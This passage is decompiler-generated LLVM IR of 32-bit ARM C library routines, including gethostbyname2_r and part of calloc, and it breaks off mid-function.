  %v5_19edc = and i32 %v2_19ed8, 65280
  %v2_19ee0 = and i32 %v5_19ec0, 65280
  %v5_19ee4 = mul nuw nsw i32 %v2_19ee0, 256
  %v5_19ee8 = mul i32 %v0_19ec0, 16777216
  %v6_19edc = or i32 %v4_19ed4, %v5_19ee8
  %v6_19ee4 = or i32 %v6_19edc, %v5_19edc
  %v6_19ee8 = or i32 %v6_19ee4, %v5_19ee4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_19ef4 = inttoptr i32 %arg2 to i32*
  store i32 %v6_19ee8, i32* %v3_19ef4, align 4
  %v2_19f00.pre = load i32, i32* %stack_var_-28, align 4
  %v1_19f04.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f00

dec_label_pc_19efc:                               ; preds = %dec_label_pc_19e9c, %dec_label_pc_19eb8, %dec_label_pc_19e48, %dec_label_pc_19e68, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f00

dec_label_pc_19f00:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_19efc
  %v1_19f04 = phi i32 [ %v1_19f04.pre, %bb ], [ 0, %dec_label_pc_19efc ], [ 1, %.thread7.thread ]
  %v2_19f00 = phi i32 [ %v2_19f00.pre, %bb ], [ %v3_19e18, %dec_label_pc_19efc ], [ %v3_19e18, %.thread7.thread ]
  store i32 %v2_19f00, i32* @r4, align 4
  ret i32 %v1_19f04

; uselistorder directives
  uselistorder i32 %v1_19ec4, { 1, 0 }
  uselistorder i32 %v5_19ec0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19eb0, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_19f00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19efc, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_19e80, { 1, 0 }
  uselistorder label %dec_label_pc_19e48, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_19f10 = load i32, i32* @r6, align 4
  %v12_19f10 = load i32, i32* @r7, align 4
  %v15_19f10 = load i32, i32* @r8, align 4
  %v18_19f10 = load i32, i32* @sb, align 4
  %v21_19f10 = load i32, i32* @sl, align 4
  %v7_19f14 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_19f14, label %dec_label_pc_19f38, label %dec_label_pc_19f58

dec_label_pc_19f38:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_19f50 = call i32 @gethostbyname_r()
  store i32 %v0_19f50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a1a4

dec_label_pc_19f58:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_19f60 = icmp eq i32 %arg2, 10
  %v2_19f64 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_19f64, align 4
  br i1 %v7_19f60, label %dec_label_pc_19f6c, label %dec_label_pc_1a1a0

dec_label_pc_19f6c:                               ; preds = %dec_label_pc_19f58
  %v1_19f6c = load i32, i32* @r7, align 4
  %v9_19f6c = icmp eq i32 %v1_19f6c, %arg1
  br i1 %v9_19f6c, label %dec_label_pc_1a1a0, label %dec_label_pc_19f74

dec_label_pc_19f74:                               ; preds = %dec_label_pc_19f6c
  %v0_19f74 = call i32 @__GI___errno_location()
  store i32 %v0_19f74, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_19f74, i32* @r5, align 4
  %v0_19f80 = load i32, i32* @r4, align 4
  %v0_19f84 = load i32, i32* @r6, align 4
  store i32 %v0_19f84, i32* %r2.global-to-local, align 4
  %v1_19f88 = inttoptr i32 %v0_19f74 to i32*
  %v2_19f88 = load i32, i32* %v1_19f88, align 4
  store i32 %v2_19f88, i32* @r4, align 4
  %v0_19f8c = load i32, i32* @r8, align 4
  store i32 %v0_19f8c, i32* %r3.global-to-local, align 4
  %v0_19f90 = load i32, i32* @r7, align 4
  store i32 %v0_19f90, i32* %v1_19f88, align 4
  %v0_19f94 = load i32, i32* @sb, align 4
  store i32 %v0_19f94, i32* %r0.global-to-local, align 4
  %v2_19f98 = load i32, i32* @sl, align 4
  %v5_19f98 = load i32, i32* %ip.global-to-local, align 4
  %v0_19f9c = load i32, i32* @fp, align 4
  %v7_19fa0 = call i32 @__get_hosts_byname_r(i32 %v0_19f94, i32 %v0_19f80, i32 %v0_19f84, i32 %v0_19f8c, i32 %v2_19f98, i32 %v5_19f98, i32 %v0_19f9c)
  store i32 %v7_19fa0, i32* %r0.global-to-local, align 4
  %v2_19fa4 = icmp eq i32 %v7_19fa0, 0
  br i1 %v2_19fa4, label %bb, label %dec_label_pc_19fb0

bb:                                               ; preds = %dec_label_pc_19f74
  %v1_19fa8 = load i32, i32* @r4, align 4
  %v2_19fa8 = load i32, i32* @r5, align 4
  %v3_19fa8 = inttoptr i32 %v2_19fa8 to i32*
  store i32 %v1_19fa8, i32* %v3_19fa8, align 4
  br label %dec_label_pc_1a1a4

dec_label_pc_19fb0:                               ; preds = %dec_label_pc_19f74
  %v0_19fb0 = load i32, i32* @fp, align 4
  %v1_19fb0 = inttoptr i32 %v0_19fb0 to i32*
  %v2_19fb0 = load i32, i32* %v1_19fb0, align 4
  store i32 %v2_19fb0, i32* %r3.global-to-local, align 4
  %v7_19fb4 = icmp eq i32 %v2_19fb0, 1
  br i1 %v7_19fb4, label %dec_label_pc_19fd0, label %dec_label_pc_19fbc

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19fb0
  %v7_19fbc = icmp eq i32 %v2_19fb0, 4
  br i1 %v7_19fbc, label %dec_label_pc_19fec, label %dec_label_pc_19fc4

dec_label_pc_19fc4:                               ; preds = %dec_label_pc_19fbc
  %v3_19fc4 = icmp eq i32 %v2_19fb0, -1
  br i1 %v3_19fc4, label %dec_label_pc_19fe0, label %dec_label_pc_1a1a4

dec_label_pc_19fd0:                               ; preds = %dec_label_pc_19fb0
  %v7_19fd0 = icmp eq i32 %v7_19fa0, 2
  br i1 %v7_19fd0, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_19fd0
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_19ff0

.thread1:                                         ; preds = %dec_label_pc_19fd0
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_19ff0

dec_label_pc_19fe0:                               ; preds = %dec_label_pc_19fc4
  %v0_19fe0 = load i32, i32* @r5, align 4
  %v1_19fe0 = inttoptr i32 %v0_19fe0 to i32*
  %v2_19fe0 = load i32, i32* %v1_19fe0, align 4
  store i32 %v2_19fe0, i32* %r3.global-to-local, align 4
  %v7_19fe4 = icmp eq i32 %v2_19fe0, 2
  br i1 %v7_19fe4, label %dec_label_pc_19fec, label %dec_label_pc_1a1a4

dec_label_pc_19fec:                               ; preds = %dec_label_pc_19fe0, %dec_label_pc_19fbc
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_19ff0

dec_label_pc_19ff0:                               ; preds = %bb29, %.thread1, %dec_label_pc_19fec
  %v0_19ff0 = load i32, i32* @r8, align 4
  %v1_19ff0 = sub i32 0, %v0_19ff0
  %v1_19ff4 = urem i32 %v1_19ff0, 4
  store i32 %v1_19ff4, i32* %r0.global-to-local, align 4
  %v1_19ff8 = load i32, i32* @sl, align 4
  %v2_19ff8 = sub i32 %v1_19ff8, %v1_19ff4
  %v1_19ffc = add i32 %v2_19ff8, -24
  store i32 %v1_19ffc, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1a008 = load i32, i32* @r4, align 4
  %v1_1a008 = load i32, i32* @r5, align 4
  %v2_1a008 = inttoptr i32 %v1_1a008 to i32*
  store i32 %v0_1a008, i32* %v2_1a008, align 4
  %v7_1a00c = icmp sgt i32 %v1_19ffc, 255
  br i1 %v7_1a00c, label %dec_label_pc_1a018, label %bb30

bb30:                                             ; preds = %dec_label_pc_19ff0
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1a010 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a010 = load i32, i32* @fp, align 4
  %v2_1a010 = inttoptr i32 %v1_1a010 to i32*
  store i32 %v0_1a010, i32* %v2_1a010, align 4
  br label %dec_label_pc_1a1a4

dec_label_pc_1a018:                               ; preds = %dec_label_pc_19ff0
  %v0_1a0103 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a0104 = load i32, i32* @fp, align 4
  %v2_1a0105 = inttoptr i32 %v1_1a0104 to i32*
  store i32 %v0_1a0103, i32* %v2_1a0105, align 4
  %v0_1a018 = load i32, i32* @r8, align 4
  %v1_1a018 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a018 = add i32 %v1_1a018, %v0_1a018
  store i32 %v2_1a018, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1a020 = add i32 %v2_1a018, 16
  store i32 %v1_1a020, i32* %r2.global-to-local, align 4
  %v1_1a024 = add i32 %v2_1a018, 24
  store i32 %v1_1a024, i32* @r5, align 4
  %v3_1a02c = inttoptr i32 %v1_1a020 to i32*
  store i32 %v2_1a018, i32* %v3_1a02c, align 4
  %v0_1a030 = load i32, i32* @sb, align 4
  store i32 %v0_1a030, i32* @r1, align 4
  %v0_1a034 = load i32, i32* @r4, align 4
  %v1_1a034 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a034 = add i32 %v1_1a034, 4
  %v3_1a034 = inttoptr i32 %v2_1a034 to i32*
  store i32 %v0_1a034, i32* %v3_1a034, align 4
  %v0_1a038 = load i32, i32* @r5, align 4
  store i32 %v0_1a038, i32* %r0.global-to-local, align 4
  %v0_1a03c = load i32, i32* @sl, align 4
  store i32 %v0_1a03c, i32* %r2.global-to-local, align 4
  %v3_1a040 = call i32 @strncpy(i32 %v0_1a038, i32 %v0_1a030, i32 %v0_1a03c)
  %v0_1a044 = load i32, i32* @r4, align 4
  %v1_1a044 = trunc i32 %v0_1a044 to i8
  %v2_1a044 = load i32, i32* @r5, align 4
  %v3_1a044 = load i32, i32* @sl, align 4
  %v4_1a044 = add i32 %v3_1a044, %v2_1a044
  %v5_1a044 = inttoptr i32 %v4_1a044 to i8*
  store i8 %v1_1a044, i8* %v5_1a044, align 1
  %v0_1a048 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1a050 = load i32, i32* @r8, align 4
  store i32 %v0_1a050, i32* %r2.global-to-local, align 4
  %v3_1a054 = inttoptr i32 %v0_1a048 to i8*
  %v4_1a054 = call i32 @inet_pton(i32 10, i8* %v3_1a054, i32 %v0_1a050)
  store i32 %v4_1a054, i32* %r0.global-to-local, align 4
  %v1_1a058 = load i32, i32* @r4, align 4
  %v9_1a058 = icmp eq i32 %v4_1a054, %v1_1a058
  br i1 %v9_1a058, label %dec_label_pc_1a090, label %dec_label_pc_1a060

dec_label_pc_1a060:                               ; preds = %dec_label_pc_1a018
  store i32 %v1_1a020, i32* @ip, align 4
  %v0_1a068 = load i32, i32* @r6, align 4
  store i32 %v0_1a068, i32* %v2_19f64, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1a070 = load i32, i32* @r6, align 4
  %v2_1a070 = add i32 %v1_1a070, 8
  %v3_1a070 = inttoptr i32 %v2_1a070 to i32*
  store i32 10, i32* %v3_1a070, align 4
  %v0_1a074 = load i32, i32* @r4, align 4
  store i32 %v0_1a074, i32* %r0.global-to-local, align 4
  %v0_1a078 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a078 = add i32 %v0_1a078, 6
  store i32 %v1_1a078, i32* %r3.global-to-local, align 4
  %v1_1a07c = load i32, i32* @r6, align 4
  %v2_1a07c = add i32 %v1_1a07c, 12
  %v3_1a07c = inttoptr i32 %v2_1a07c to i32*
  store i32 %v1_1a078, i32* %v3_1a07c, align 4
  %v0_1a080 = load i32, i32* @r5, align 4
  %v1_1a080 = load i32, i32* @r6, align 4
  %v2_1a080 = inttoptr i32 %v1_1a080 to i32*
  store i32 %v0_1a080, i32* %v2_1a080, align 4
  %v0_1a084 = load i32, i32* @ip, align 4
  %v1_1a084 = load i32, i32* @r6, align 4
  %v2_1a084 = add i32 %v1_1a084, 16
  %v3_1a084 = inttoptr i32 %v2_1a084 to i32*
  store i32 %v0_1a084, i32* %v3_1a084, align 4
  %v0_1a088 = load i32, i32* @r4, align 4
  %v1_1a088 = load i32, i32* @fp, align 4
  %v2_1a088 = inttoptr i32 %v1_1a088 to i32*
  store i32 %v0_1a088, i32* %v2_1a088, align 4
  br label %dec_label_pc_1a1a4

dec_label_pc_1a090:                               ; preds = %dec_label_pc_1a018
  %v0_1a090 = load i32, i32* @r7, align 4
  %v2_1a090 = icmp eq i32 %v0_1a090, 0
  br i1 %v2_1a090, label %dec_label_pc_1a098, label %dec_label_pc_1a190

dec_label_pc_1a098:                               ; preds = %dec_label_pc_1a090
  %v2_1a098 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1a098, i32* @r4, align 4
  store i32 %v2_1a098, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_1a0a8 = bitcast i32* %stack_var_-84 to i8*
  %v3_1a0a8 = call i32 @__GI_memset(i8* %v2_1a0a8, i32 0)
  store i32 %v3_1a0a8, i32* %r0.global-to-local, align 4
  %v2_1a0b0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1a0b0, i32* @sb, align 4
  %v7_1a0f0 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1a0b4

dec_label_pc_1a0b4:                               ; preds = %dec_label_pc_1a108, %dec_label_pc_1a098
  store i32 %v2_1a0b0, i32* %r2.global-to-local, align 4
  store i32 %v2_1a098, i32* %r3.global-to-local, align 4
  %v0_1a0c0 = load i32, i32* @r5, align 4
  store i32 %v0_1a0c0, i32* %r0.global-to-local, align 4
  %v4_1a0c4 = inttoptr i32 %v0_1a0c0 to i8*
  %v5_1a0c4 = call i32 @__dns_lookup(i8* %v4_1a0c4, i32 28, i32 %v2_1a0b0, i32 %v2_1a098)
  store i32 %v5_1a0c4, i32* @r4, align 4
  %v1_1a0c8 = icmp slt i32 %v5_1a0c4, 0
  %v0_1a0cc = load i32, i32* @sl, align 4
  store i32 %v0_1a0cc, i32* %r2.global-to-local, align 4
  %v0_1a0d0 = load i32, i32* @r7, align 4
  %v1_1a0d0 = add i32 %v0_1a0d0, 1
  store i32 %v1_1a0d0, i32* @r7, align 4
  %v0_1a0d4 = load i32, i32* @r5, align 4
  store i32 %v0_1a0d4, i32* %r0.global-to-local, align 4
  br i1 %v1_1a0c8, label %dec_label_pc_1a190, label %dec_label_pc_1a0dc

dec_label_pc_1a0dc:                               ; preds = %dec_label_pc_1a0b4
  %v3_1a0dc = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1a0dc, i32* @r1, align 4
  %v3_1a0e0 = call i32 @strncpy(i32 %v0_1a0d4, i32 %v3_1a0dc, i32 %v0_1a0cc)
  %v3_1a0e4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1a0e4, i32* @r0, align 4
  %v0_1a0e8 = call i32 @free()
  store i32 %v0_1a0e8, i32* %r0.global-to-local, align 4
  %v0_1a0f4 = load i32, i32* @r4, align 4
  store i32 %v0_1a0f4, i32* %r2.global-to-local, align 4
  %v0_1a0f8 = load i32, i32* @r5, align 4
  store i32 %v0_1a0f8, i32* @r3, align 4
  br i1 %v7_1a0f0, label %dec_label_pc_1a100, label %dec_label_pc_1a138

dec_label_pc_1a100:                               ; preds = %dec_label_pc_1a0dc
  %v0_1a100 = load i32, i32* @r7, align 4
  %v8_1a104 = icmp sgt i32 %v0_1a100, 5
  br i1 %v8_1a104, label %dec_label_pc_1a12c, label %dec_label_pc_1a108

dec_label_pc_1a108:                               ; preds = %dec_label_pc_1a100
  store i32 %tmp8, i32* @r1, align 4
  %v3_1a10c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a10c, i32* %r0.global-to-local, align 4
  %v0_1a110 = load i32, i32* @sl, align 4
  %v5_1a114 = call i32 @__decode_dotted(i32 %v3_1a10c, i32 %tmp8, i32 %v0_1a0f4, i32 %v0_1a0f8, i32 %v0_1a110)
  store i32 %v5_1a114, i32* @r4, align 4
  %v3_1a11c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a11c, i32* @r0, align 4
  %v0_1a120 = call i32 @free()
  store i32 %v0_1a120, i32* %r0.global-to-local, align 4
  %v0_1a124 = load i32, i32* @r4, align 4
  %v1_1a124 = icmp slt i32 %v0_1a124, 0
  br i1 %v1_1a124, label %dec_label_pc_1a12c, label %dec_label_pc_1a0b4

dec_label_pc_1a12c:                               ; preds = %dec_label_pc_1a108, %dec_label_pc_1a100
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a198

dec_label_pc_1a138:                               ; preds = %dec_label_pc_1a0dc
  %v7_1a138 = icmp eq i32 %tmp9, 28
  br i1 %v7_1a138, label %dec_label_pc_1a140, label %dec_label_pc_1a188

dec_label_pc_1a140:                               ; preds = %dec_label_pc_1a138
  store i32 16, i32* @r2, align 4
  %v0_1a148 = load i32, i32* @r8, align 4
  store i32 %v0_1a148, i32* @r0, align 4
  %v0_1a14c = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1a020, i32* %r2.global-to-local, align 4
  %v1_1a158 = load i32, i32* @r6, align 4
  %v2_1a158 = add i32 %v1_1a158, 8
  %v3_1a158 = inttoptr i32 %v2_1a158 to i32*
  store i32 10, i32* %v3_1a158, align 4
  %v0_1a15c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a15c = add i32 %v0_1a15c, 6
  store i32 %v1_1a15c, i32* %r3.global-to-local, align 4
  %v1_1a160 = load i32, i32* @r6, align 4
  %v2_1a160 = add i32 %v1_1a160, 12
  %v3_1a160 = inttoptr i32 %v2_1a160 to i32*
  store i32 %v1_1a15c, i32* %v3_1a160, align 4
  %v3_1a164 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a164, i32* @r0, align 4
  %v0_1a168 = load i32, i32* @r5, align 4
  %v1_1a168 = load i32, i32* @r6, align 4
  %v2_1a168 = inttoptr i32 %v1_1a168 to i32*
  store i32 %v0_1a168, i32* %v2_1a168, align 4
  %v0_1a16c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a16c = load i32, i32* @r6, align 4
  %v2_1a16c = add i32 %v1_1a16c, 16
  %v3_1a16c = inttoptr i32 %v2_1a16c to i32*
  store i32 %v0_1a16c, i32* %v3_1a16c, align 4
  %v0_1a170 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1a180 = load i32, i32* @r6, align 4
  store i32 %v0_1a180, i32* %v2_19f64, align 4
  %v0_1a198.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a198

dec_label_pc_1a188:                               ; preds = %dec_label_pc_1a138
  %v3_1a188 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a188, i32* @r0, align 4
  %v0_1a18c = call i32 @free()
  store i32 %v0_1a18c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a190

dec_label_pc_1a190:                               ; preds = %dec_label_pc_1a0b4, %dec_label_pc_1a090, %dec_label_pc_1a188
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a198

dec_label_pc_1a198:                               ; preds = %dec_label_pc_1a140, %dec_label_pc_1a12c, %dec_label_pc_1a190
  %v0_1a198 = phi i32 [ %v0_1a198.pre, %dec_label_pc_1a140 ], [ 3, %dec_label_pc_1a12c ], [ 1, %dec_label_pc_1a190 ]
  %v1_1a198 = load i32, i32* @fp, align 4
  %v2_1a198 = inttoptr i32 %v1_1a198 to i32*
  store i32 %v0_1a198, i32* %v2_1a198, align 4
  br label %dec_label_pc_1a1a4

dec_label_pc_1a1a0:                               ; preds = %dec_label_pc_19f58, %dec_label_pc_19f6c
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a1a4

dec_label_pc_1a1a4:                               ; preds = %bb, %bb30, %dec_label_pc_19fe0, %dec_label_pc_19fc4, %dec_label_pc_1a198, %dec_label_pc_1a060, %dec_label_pc_19f38, %dec_label_pc_1a1a0
  store i32 %v9_19f10, i32* @r6, align 4
  store i32 %v12_19f10, i32* @r7, align 4
  store i32 %v15_19f10, i32* @r8, align 4
  store i32 %v18_19f10, i32* @sb, align 4
  store i32 %v21_19f10, i32* @sl, align 4
  %v1_1a1ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a1ac

; uselistorder directives
  uselistorder i32 %v2_1a098, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a020, { 2, 1, 0, 3 }
  uselistorder i32 %v1_19ff4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a1a4, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1a1a0, { 1, 0 }
  uselistorder label %dec_label_pc_1a198, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a190, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19ff0, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1a1b0 = load i32, i32* @r4, align 4
  %v6_1a1b0 = load i32, i32* @r5, align 4
  %v9_1a1b0 = load i32, i32* @r6, align 4
  %v12_1a1b0 = load i32, i32* @lr, align 4
  %v2_1a1b8 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1a1c8 = mul i32 %arg2, %arg1
  store i32 %v2_1a1c8, i32* @r6, align 4
  br i1 %v2_1a1b8, label %dec_label_pc_1a1f8, label %dec_label_pc_1a1d0

dec_label_pc_1a1d0:                               ; preds = %entry
  %v2_1a1d8 = udiv i32 %v2_1a1c8, %arg1
  %v9_1a1dc = icmp eq i32 %v2_1a1d8, %arg2
  br i1 %v9_1a1dc, label %dec_label_pc_1a1f8, label %dec_label_pc_1a1e4

dec_label_pc_1a1e4:                               ; preds = %dec_label_pc_1a1d0
  %v0_1a1e4 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a1f0 = inttoptr i32 %v0_1a1e4 to i32*
  store i32 12, i32* %v2_1a1f0, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a1f8:                               ; preds = %dec_label_pc_1a1d0, %entry
  %v4_1a1fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 76) to i32*), align 4
  store i32 %v4_1a1fc, i32* @r4, align 4
  %v4_1a214 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  store i32 %v4_1a214, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1a214)
  %v0_1a228 = load i32, i32* @r5, align 4
  %v2_1a228 = add i32 %v0_1a228, 20
  %v3_1a228 = inttoptr i32 %v2_1a228 to i32*
  %v4_1a228 = load i32, i32* %v3_1a228, align 4
  store i32 %v4_1a228, i32* %ip.global-to-local, align 4
  store i32 107060, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a228)
  %v0_1a234 = load i32, i32* @r6, align 4
  %v1_1a238 = call i32 @malloc(i32 %v0_1a234)
  store i32 %v1_1a238, i32* %r4.global-to-local, align 4
  %v2_1a23c = icmp eq i32 %v1_1a238, 0
  br i1 %v2_1a23c, label %.thread, label %dec_label_pc_1a244

dec_label_pc_1a244:                               ; preds = %dec_label_pc_1a1f8
  %v1_1a244 = add i32 %v1_1a238, -4
  %v2_1a244 = inttoptr i32 %v1_1a244 to i32*
  %v3_1a244 = load i32, i32* %v2_1a244, align 4
  %v1_1a248 = and i32 %v3_1a244, 2
  %v2_1a248 = icmp eq i32 %v1_1a248, 0
  br i1 %v2_1a248, label %dec_label_pc_1a250, label %.thread

dec_label_pc_1a250:                               ; preds = %dec_label_pc_1a244
  %v1_1a2506 = add i32 %v3_1a244, -4
  %v1_1a254 = and i32 %v1_1a2506, -4
  store i32 %v1_1a254, i32* @r2, align 4
  %v3_1a258 = udiv i32 %v1_1a254, 4
  store i32 %v3_1a258, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1a254, 36
  %v2_1a260 = icmp ult i32 %v1_1a254, 33
  %v3_1a260 = or i1 %tmp, %v2_1a260
  br i1 %v3_1a260, label %dec_label_pc_1a26c, label %dec_label_pc_1a264

dec_label_pc_1a264:                               ; preds = %dec_label_pc_1a250
  %v2_1a264 = inttoptr i32 %v1_1a238 to i8*
  %v3_1a264 = call i32 @__GI_memset(i8* %v2_1a264, i32 0)
  br label %.thread

dec_label_pc_1a26c:                               ; preds = %dec_label_pc_1a250
  %tmp7 = icmp eq i32 %v1_1a254, 16
  %v2_1a270 = inttoptr i32 %v1_1a238 to i32*
  store i32 0, i32* %v2_1a270, align 4
  %v1_1a274 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a274 = add i32 %v1_1a274, 4
  %v3_1a274 = inttoptr i32 %v2_1a274 to i32*
  store i32 0, i32* %v3_1a274, align 4
  %v1_1a278 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a278 = add i32 %v1_1a278, 8
  %v3_1a278 = inttoptr i32 %v2_1a278 to i32*
  store i32 0, i32* %v3_1a278, align 4
  %v2_1a27c = icmp ult i32 %v1_1a254, 13
  %v3_1a27c = or i1 %tmp7, %v2_1a27c
  br i1 %v3_1a27c, label %.thread, label %dec_label_pc_1a280

dec_label_pc_1a280:                               ; preds = %dec_label_pc_1a26c
  %v0_1a280 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a284 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a284 = add i32 %v1_1a284, 12
  %v3_1a284 = inttoptr i32 %v2_1a284 to i32*
  store i32 0, i32* %v3_1a284, align 4
  %v1_1a288 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a288 = add i32 %v1_1a288, 16
  %v3_1a288 = inttoptr i32 %v2_1a288 to i32*
  store i32 0, i32* %v3_1a288, align 4
  %tmp8 = icmp ult i32 %v0_1a280, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1a290

dec_label_pc_1a290:                               ; preds = %dec_label_pc_1a280
  %v0_1a290 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a290 = icmp eq i32 %v0_1a290, 9
  %v1_1a294 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a294 = add i32 %v1_1a294, 20
  %v3_1a294 = inttoptr i32 %v2_1a294 to i32*
  store i32 0, i32* %v3_1a294, align 4
  %v1_1a298 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a298 = add i32 %v1_1a298, 24
  %v3_1a298 = inttoptr i32 %v2_1a298 to i32*
  store i32 0, i32* %v3_1a298, align 4
  br i1 %v7_1a290, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a290
  %v2_1a29c = load i32, i32* %r4.global-to-local, align 4
  %v3_1a29c = add i32 %v2_1a29c, 32
  %v4_1a29c = inttoptr i32 %v3_1a29c to i32*
  store i32 0, i32* %v4_1a29c, align 4
  %v2_1a2a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a2a0 = add i32 %v2_1a2a0, 28
  %v4_1a2a0 = inttoptr i32 %v3_1a2a0 to i32*
  store i32 0, i32* %v4_1a2a0, align 4
  br label %.thread

